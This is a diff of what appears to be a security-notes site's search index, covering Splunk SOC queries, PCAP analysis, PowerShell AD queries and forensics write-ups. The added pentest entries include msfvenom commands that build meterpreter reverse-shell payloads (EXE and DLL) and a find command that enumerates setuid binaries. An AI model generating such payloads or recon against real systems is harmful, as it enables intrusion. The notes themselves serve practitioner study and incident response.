@@ -43,7 +43,7 @@
   },"7": {
     "doc": "linux command examples - find",
     "title": "linux command examples - find",
-    "content": "Linux command examples - find -------------------------------------------- Finding pdf files created las 24 hours in Downloads direectory: ``` find ~/Dowloads -iname *.pdf -a -ctime 1 ``` ",
+    "content": "Linux command examples - find -------------------------------------------- Finding pdf files created las 24 hours in Downloads direectory: ``` find ~/Dowloads -iname *.pdf -a -ctime 1 ``` ``` find / -perm +6000 -type f -exec ls -ld {} \\; > setuid.txt & find / -perm +4000 -user root -type f - ``` ",
     "url": "/docs/system/lin-find.html",
     "relUrl": "/docs/system/lin-find.html"
   },"8": {
@@ -89,70 +89,100 @@
     "url": "/docs/networking/networking.html",
     "relUrl": "/docs/networking/networking.html"
   },"15": {
+    "doc": "linux sambacry",
+    "title": "linux sambacry",
+    "content": "CVE ID : CVE-2017-7494 Date: 01/06/2017 https://github.com/ptresearch/AttackDetection/blob/master/CVE-2017-7494/CVE-2017-7494.rules ![Pentest Linux Sambacry](/docs/pentest/pen-lin-smb-rce-2017-7494_1.png) ![Pentest Linux Sambacry](/docs/pentest/pen-lin-smb-rce-2017-7494_2.png) ![Pentest Linux Sambacry](/docs/pentest/pen-lin-smb-rce-2017-7494_3.png) ![Pentest Linux Sambacry](/docs/pentest/pen-lin-smb-rce-2017-7494_4.png) ",
+    "url": "/docs/pentest/pen-lin-smb-rce-2017-7494.html",
+    "relUrl": "/docs/pentest/pen-lin-smb-rce-2017-7494.html"
+  },"16": {
+    "doc": "msfvenom payload",
+    "title": "msfvenom payload",
+    "content": "Generating payload with msfvenom either a dll or an executable file: ``` msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f exe > /tmp/meter-rtcp-192.168.156.1-80.exe msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.156.1 lport=80 -f dll > /tmp/meter-rtcp-192.168.156.1-80.dll ``` ",
+    "url": "/docs/pentest/pen-payload-msfvenom.html",
+    "relUrl": "/docs/pentest/pen-payload-msfvenom.html"
+  },"17": {
+    "doc": "Pentest",
+    "title": "Pentest",
+    "content": " ",
+    "url": "/docs/pentest/pentest.html",
+    "relUrl": "/docs/pentest/pentest.html"
+  },"18": {
     "doc": "pfsense",
     "title": "pfsense",
     "content": "Check pfsense firmware version and the corresponding FreeBSD version here: https://docs.netgate.com/pfsense/en/latest/releases/versions-of-pfsense-and-freebsd.html After installing (setting vmx0 vlan and IP address + webconfigurator http protocol), log as admin and password pfsense: https://docs.netgate.com/pfsense/en/latest/usermanager/pfsense-default-username-and-password.html ",
     "url": "/docs/networking/pfsense.html",
     "relUrl": "/docs/networking/pfsense.html"
-  },"16": {
+  },"19": {
     "doc": "SIEM",
     "title": "SIEM",
     "content": " ",
     "url": "/docs/siem/siem.html",
     "relUrl": "/docs/siem/siem.html"
-  },"17": {
+  },"20": {
     "doc": "splunk queries by ip",
     "title": "splunk queries by ip",
     "content": "# Splunk Queries by IP **Table of Contents** - [Windows queries ](##windows-queries) - [Windows domain controller 1 ](##windows-dc-1) - [Windows domain controller 2 ](##windows-dc-2) - [Suricata queries ](##suricata-queries) - [Suricata: Alertes IDS](##suricata:-alertes-ids) - [Suricata: Alertes IDS par IP source et destination 1](##suricata-alertes-ids-par-ip-source-et-destination-1) - [Suricata: Alertes IDS par IP source et destination 2](##suricata:-alertes-ids-par-ip-source-et-destination-2) - [Suricata: Répartition des User-agents HTTP dans le temps](##suricata:repartition-des-user-agents-htt-dans-le-temps) - [Suricata: Téléchargement de fichiers en HTTP dans le temps](##suricata:-telechargement-de-fichiers-en-htt-dans-le-temps) ## Windows queries Windows DC 1: ``` host=10.2.3..5 Source_Network_Address=* Logon_Type=3 (EventCode=4624 OR EventCode=4625) $addr_ip$ | fields Security_ID, Source_Network_Address, host, EventCode | lookup reversedns ip as Source_Network_Address | lookup wineventcode.csv code as EventCode OUTPUT description as Description | stats count by Security_ID, Source_Network_Address, EventCode, host, Description | table Security_ID, Source_Network_Address, host, EventCode, Description, count | sort -count | rename Source_Network_Address as \"Adresse IP Source\", count as \"Nb événements\", host as \"Nom de l'hôte\" ``` Windows DC 2: ``` host=10.2.3.5 (Source_Address=* OR Destination_Address=*) EventCode=515* $addr_ip$ | fields Source_Address, Source_Port, Destination_Address, Destination_Port,EventCode, Layer_Name | lookup reversedns ip as Destination_Address OUTPUT host as host_dst | lookup reversedns ip as Source_Address OUTPUT host as host_src | lookup wineventcode.csv code as EventCode OUTPUT description as Description | rename Source_Port as service | rename Destination_Port as service | where service=3389 OR service&lt;1024 | stats count by Source_Address, Destination_Address, service, EventCode, Layer_Name, host_src, host_dst, Description | table Source_Address, host_src, Destination_Address, host_dst, service, EventCode, Description, Layer_Name, count | sort -count | rename Source_Address as \"Adresse IP Source\", Destination_Address as \"Adresse IP Destination\", service as Service, Layer_Name as \"Action\", count as \"Nb événements\", host_dst as \"Nom de l'hôte destination\", host_src as \"Nom de l'hôte source\", host_dst as \"Nom de l'hôte destination\" ``` Windows DC: Succès d'authentifications dans le temps ``` host=10.2.3.5 Source_Network_Address=* Logon_Type=3 (EventCode=4624) $addr_ip$ | fields Security_ID, EventCode | timechart count(EventCode) by Security_ID ``` Windows DC: Echecs d'authentifications dans le temps ``` host=10.2.3.5 Source_Network_Address=* Logon_Type=3 (EventCode=4625) $addr_ip$ | fields Security_ID, EventCode | timechart count(EventCode) by Security_ID ``` Windows DC: Filtrage réseau ``` host=10.2.3.5 (Source_Address=$addr_ip$ OR Destination_Address=$addr_ip$) EventCode=515* | fields Source_Address, Source_Port, Destination_Address, Destination_Port,EventCode | cluster showcount=t | table cluster_count Source_Port, Source_Address, EventCode, Destination_Address, Destination_Port ``` ## Suricata queries ### Suricata: Alertes IDS ``` index=suricata $addr_ip$ | dedup src_ip dest_ip alert.signature | search alert.signature!=\"\" | lookup reversedns ip as dest_ip OUTPUT host as host_dst | lookup reversedns ip as src_ip OUTPUT host as host_src | table _time, src_ip, host_src, src_port, dest_ip, host_dst, dest_port, alert.signature | rename alert.signature as Signature, src_ip as \"Source IP\", dest_ip as \"Destination IP\", src_port as \"Source port\", dest_port as \"Destination port\", host_src as \"Nom de l'hôte source\", host_dst as \"Nom de l'hôte destination\" ``` ### Suricata: Alertes IDS par User-agents ``` index=suricata src_ip=$addr_ip$ | fields http.http_user_agent, src_ip, flow_id, dest_ip | rename http.http_user_agent as http_user_agent | lookup user_agents http_user_agent | search ua_os_family!=unknown | stats count(flow_id) as \"Flow\" by ua_family, ua_os_family, src_ip, dest_ip | table src_ip, ua_family, ua_os_family, dest_ip, Flow | rename ua_family as Navigateurs, ua_os_family as OS, Flow as \"Nb trafics\", src_ip as \"IP Sources\", dest_ip as \"IP Destinations\" ``` ### Suricata: Alertes IDS par IP source et destination 1 ``` index=suricata (src_ip=$addr_ip$) | fields src_ip, dest_ip, alert.signature | search alert.signature!=\"\" | rename alert.signature as signature | cluster showcount=t | table cluster_count src_ip dest_ip signature ``` ### Suricata: Alertes IDS par IP source et destination 2 ``` index=suricata $addr_ip$ | search alert.signature!=\"\" | rename alert.signature as Signature | iplocation src_ip | stats count by Signature, src_ip, dest_ip | table src_ip, dest_ip, Signature, count | rename src_ip as \"Source IP\", dest_ip as \"Destination IP\", src_port as \"Source port\", dest_port as \"Destination port\", count as \"Nb déclenchement signature\" ``` ### Suricata: Répartition des User-agents HTTP dans le temps ``` index=suricata src_ip=$addr_ip$ | fields http.http_user_agent, src_ip, flow_id, dest_ip | rename http.http_user_agent as http_user_agent | lookup user_agents http_user_agent | timechart count(flow_id) as \"Flow\" by http_user_agent ``` ### Suricata: Téléchargement de fichiers en HTTP dans le temps ``` index=suricata event_type=fileinfo fileinfo.filename!=*/centreon/* fileinfo.filename!=\"/\" fileinfo.filename!=*allmetrics* http.hostname!=*sophosupd.com http.hostname!=*.acme.fr http.hostname!=*.microsoft.com http.hostname!=\"dci.sophosupd.net\" http.hostname!=*.zscaler.net http.hostname!=*.digicert.com http.hostname!=download.windowsupdate.com http.hostname!=*.firefox.com fileinfo.magic!=\"ASCII text, with no line terminators\" $addr_ip$ | timechart count(fileinfo.size) by http.hostname ``` ",
     "url": "/docs/siem/splunk-queries-by-ip.html",
     "relUrl": "/docs/siem/splunk-queries-by-ip.html"
-  },"18": {
+  },"21": {
     "doc": "splunk queries by user",
     "title": "splunk queries by user",
     "content": "# Splunk Queries by user **Table of Contents** - [Splunk queries by user](#splunk-queries-by-user) - [O365: emails bloques](#o365:-emails-bloques#) - [Windows: acces aux partages](#windows:-acces-aux-partages) - [Windows: acces aux partages à privilèges](#windows:-acces-aux-partages-a-privileges) ## Splunk Queries by user ### O365: mails entrants bloqués ``` sourcetype=\"ms:o365:reporting:messagetrace\" (action=FilteredAsSpam OR action=quarantained) RecipientAddress=$user_account$@acme.fr | fields FromIP, Subject, SenderAddress, Country, City | stats count(Subject) as nbmail by FromIP, Subject, SenderAddress | sort -nbmail | iplocation FromIP | table nbmail, FromIP, Country, City, SenderAddress, Subject ``` Windows: accès aux partages ``` host=10.1.2.5 Account_Name=$user_account$ EventCode=4728 | table ComputerName, Group_Name, Account_Name, EventCode | rename ComputerName as \"Serveur AD\", Group_Name as \"Groupe Administrateur modifié\", Account_Name as \"Administrateur responsable de la modification \\r\\n Compte rajouté\" ``` Windows Accès aux partages à privilège: C$, ADMIN$ ``` host=10.1.2.5 EventCode=5145 (Share_Name=\"*\\\\C$$\" OR Share_Name=\"*\\\\Admin$$\") Account_Name=$user_account$ | timechart count by Account_Name ``` ",
     "url": "/docs/siem/splunk-queries-by-user.html",
     "relUrl": "/docs/siem/splunk-queries-by-user.html"
-  },"19": {
+  },"22": {
     "doc": "splunk quickstart",
     "title": "splunk quickstart",
     "content": "# Splunk QuickStart **Table of Contents** - [Platform health monitoring](#platform-health-monitoring) - [Dashboards](##dashboards) ## Platform health monitoring ![Splunk health monitoring](/docs/siem/splunk-health-monitoring.png) Format: ![Alt Splunk health monitoring]({{%site.url%}}docs/siem/splunk-health-monitoring.png) ### Dashboards here: here: here: [XXX](https://wiki.org/wiki/) ",
     "url": "/docs/siem/splunk.html",
     "relUrl": "/docs/siem/splunk.html"
-  },"20": {
+  },"23": {
     "doc": "System",
     "title": "System",
     "content": " ",
     "url": "/docs/system/system.html",
     "relUrl": "/docs/system/system.html"
-  },"21": {
+  },"24": {
     "doc": "tshark",
     "title": "tshark",
     "content": "# PCAP analysis with TSHARK ## Extract asset: IP list, HTTP hotsnames Extract of HTTP host to CSV : ``` tshark -nl -T fields -e ip.src -e ip.dst -e http.host -r request_1426258128.pcap | sort | uniq > 2389_http_streams.csv ``` Extract of source and destination IP addresses to CSV : ``` tshark -nl -T fields -e ip.src -e ip.dst -r request_1426258128.pcap | sort | uniq > 2389_ip_streams.csv ``` Extract in-addr.arpa in DNS PTR response to CSV : ``` tshark -nl -T fields -e dns.qry.name -r request_1426258128.pcap | sort | uniq > 2389_dns_ptr_C2_response.csv 139.253.2.195.in-addr.arpa 166.119.19.193.in-addr.arpa ``` Cast in-addr.arpa to IPv4 : ``` cat 2389_dns_ptr_C2_response.csv | arpa2ip 195.2.253.139 193.19.119.166 ``` Cast IPv4 set to tcpdump list : ``` cat 2389_DNS_ptr_C2_ip.csv | tcplist '( 195.88.208.131 or 195.2.253.139 or 193.19.119.166 or 195.88.209.169 or 195.2.253.204 or 195.88.208.250 or 193.19.118.27 or 195.2.252.44 or 195.88.208.56 or 195.88.209.6 or 193.19.118.94 )' ``` Match in wireshark packets with Sourcefire IOC strings In the example here, convert the string () { (shellshock) to hexadecimal value (NOTE: skip 0a which is the EOF) ``` [19:27:16] jomivz@sans-sift:1793 $ echo () { > ioc.ascii [19:27:23] jomivz@sans-sift:1793 $ xxd ioc.ascii 0000000: 2829 207b 0a () {. [19:27:28] jomivz@csirt-sans-sift:1793 $ ``` Apply the related BFP filter in Wireshark : ``` tcp.segment_data contains 28:29:20:7b ``` Look for IP asset in CDA list ``` cat 1793_ip_streams_dstip_AL.csv| greplist | grep -f /assets/CDA_sorted_IP.txt ``` Tcpdump capture from IP asset Capture_on_IDS with the tcpdump list ``` root@SF-SENSOR:/Volume/home/admin# tcpdump -i nfe0.1.22 -c 1000 host '( 195.88.208.131 or 195.2.253.139 or 193.19.119.166 or 195.88.209.169 or 195.2.53.204 or 195.88.208.250 or 193.19.118.27 or 195.2.252.44 or 195.88.208.56 or 195.88.209.6 or 193.19.118.94 )' -w 2389_2.pcap ``` ",
     "url": "/docs/networking/tshark.html",
     "relUrl": "/docs/networking/tshark.html"
-  },"22": {
+  },"25": {
+    "doc": "memory dump virtualbox",
+    "title": "memory dump virtualbox",
+    "content": "# Dumping Memory of a VirtualBox Machine Launch the VM in debug mode using CLI : ``` > vboxmanage list vms > virtualbox --dbg --startvm ``` Click on the \"Debug\" menu -> \"Command line...\". VBoxDbg > .pgmphystofile .mm ",
+    "url": "/docs/forensics/vbox-dump-memory.html",
+    "relUrl": "/docs/forensics/vbox-dump-memory.html"
+  },"26": {
     "doc": "mounting bitlocker partition on Windows",
     "title": "mounting bitlocker partition on Windows",
     "content": "Mounting BitLocker Encrypted Drive on Windows # Convert Raw Image Files to VHD Compatible File Virtual Hard Disk (VHD) tool is an unmanaged code command-line tool which provides useful VHD manipulation functions including instant creation of large fixed-size VHDs. VHD Tool 2.0 tool can be obtained from either of the below sources: http://archive.msdn.microsoft.com/vhdtool/Release/ProjectReleases.aspx?ReleaseId=5344 # VHD Tool 2.0 Usage 1. Download the VhdTool.exe to D:\\. 2. Open an elevated command prompt and navigate to D:\\. 3. Execute the following command: VhdTool.exe /convert raw_disk_image_filename.ntfs. # Mount VHD via Windows Disk Management Tool 1. Open Disk Management via Start > Run > diskmgmt.msc. 2. On the Menu bar, Action > Attach VHD. 3. Browse to the location of the raw disk image folder. Ensure that All files (*.*) is selected. NOTE: Do not checked Read-only else even when the correct recovery key is entered later on, it will alert you that it is incorrect.[2] 4. Select Type the recovery key when prompted. 5. Enter the recovery key and click NEXT. NOTE: Every recovery key has a password ID. Ensure that the recovery key entered is for the password ID shown to you. # Unmount VHD via Windows Disk Management Tool 1. Right click on the mounted VHD and click on Detach VHD. On “acme.corp”, right click and choose “Find” Choose “Computer”, type the computer name, click on “Find Now”. On section “Search Results”, pick the computer. Go to “BitLocker Recovery” tab to retrieve BitLocker Recovery Password ",
     "url": "/docs/forensics/win-mount-part-bitlocker.html",
     "relUrl": "/docs/forensics/win-mount-part-bitlocker.html"
-  },"23": {
+  },"27": {
     "doc": "PS group listing to CSV",
     "title": "PS group listing to CSV",
     "content": "PS script for detailled listing of Group Members --------------------------------------------- ``` Get-ADgroup EMEA-PXY-Web-ReadWrite -Property * | Select-Object -ExpandProperty Members Get-ADgroup EMEA-PXY-Web-ReadWriteUpload -Property * | Select-Object -ExpandProperty Members import-module activeDirectory $GroupMember = \"EMEA-PXY-Web-ReadWriteUpload\" $ResultFileName = \"C:\\Users\\x123456\\Documents\\EMEA-PXY-Web-ReadWriteUpload.csv\" $Members=Get-ADGroupMember -identity $GroupMember -recursive $Result = @(); foreach ($Member in $Members){ $User = Get-ADObject $Member -Properties name,displayName,department; $result += New-object -TypeName psobject -Property @{ 'Compte AD'=$User.name; 'Nom Prenom'=$User.displayName; 'Direction-Service'=$User.department; } } $Result|Export-csv -path $ResultFileName -delimiter ';' -NoTypeInformation -Encoding UTF8 -Force; Type $ResultFileName ``` ",
     "url": "/docs/system/win-ps-group-listing-to-csv.html",
     "relUrl": "/docs/system/win-ps-group-listing-to-csv.html"
-  },"24": {
+  },"28": {
     "doc": "PS useful queries",
     "title": "PS useful queries",
     "content": "PS sysadmin useful queries ----------------------------------------------- * Installing telnet clients : ``` Import-module servermanager Add-windowsfeature telnet-client ``` * ActiveDirectory module mandatory for the following commands : ``` Import-module ActiveDirectory ``` * Listing User Groups : ``` Get-ADuser x123456 -Property * | Select-Object -ExpandProperty MemberOf ``` * Listing Group Members : ``` Get-ADGroup EMEA-PXY-Web-ReadWrite -Property * | Select-Object -ExpandProperty Member ``` * PasswordLastSet : ``` Get-ADUser 'x123456' -properties PasswordLastSet | Format-List ``` * Matching Group Name for USB : ``` Get-ADuser x123456 -Property * | Select-Object -ExpandProperty MemberOf | findstr 'DEVICECONTROL' ``` * Matching Group Name for DA : ``` Get-ADuser x123456 -Property * | Select-Object -ExpandProperty MemberOf | findstr 'Domain Admins' ``` * Matching Group Name 2 : ``` Get-ADPrincipalGroupMembership -Identity x123456 | Select-Object -ExpandProperty MemberOf | Where-Object {$_.name -like '*DEVICECONTROL*' } ``` * Listing Computer Info : ``` Get-ADComputer -Filter {Name -Like \"dell-xps*\"} -Property * | Format-Table Name,OperatingSystem,OperatingSystemServicePack,OperatingSystemVersion -Wrap -Auto ``` * Listing Win > 6.1 : ``` Get-ADComputer -Filter {OperatingSystemVersion -ge \"6.1\"} -Property * | Format-Table Name,OperatingSystem,OperatingSystemVersion -Wrap -Auto ``` ",
     "url": "/docs/system/win-ps-useful-queries.html",
     "relUrl": "/docs/system/win-ps-useful-queries.html"
-  },"25": {
+  },"29": {
     "doc": "Windows",
     "title": "Windows",
     "content": " ",
     "url": "/docs/system/windows.html",
     "relUrl": "/docs/system/windows.html"
+  },"30": {
+    "doc": "wordpress XSS injection",
+    "title": "wordpress XSS injection",
+    "content": "# Analysing XSS injection in MYD Copying the MYD files on csirt-sans-sift - Create a new folder in /var/lib/mysql/database-name and give to database-name the name you want: ``` sudo mkdir /var/lib/mysql/springfield ``` - Upload the files in the created new folder with WinSCP - Change the linux owner permissions for those files to mysql:mysql: ``` sudo chown mysql:mysql -r /var/lib/mysql/springfield/ ``` # Starting MySQL server Run the command ``` sudo mysql start -u root -p ``` Launch mysql client as per below : ``` mysql > use acme; mysql > exit ``` # Querying imported MYD files Based on timestamps of the XSS attack on the ACME website via WordPress, we had to check if the MySQL backups were sain. We parsed for the iframe injection in the table hbrhui used by the fancybox vulnerable plugin (Sucuri Article). ``` mysql > SELECT option_value FROM wp_hbrhui_options WHERE CHAR_LENGTH(option_value) > 50 INTO OUTFILE '/tmp/dump_20_option_name.txt'; ``` Greping for URL of redirection, we proof the backup is compromised. ![XSS in MYD](/docs/forensics/wordpress-xss-injection.png) # Stopping MySQL server Run the command: ``` sudo mysql stop ``` ",
+    "url": "/docs/forensics/wordpress-xss.injection.html",
+    "relUrl": "/docs/forensics/wordpress-xss.injection.html"
   }
 }
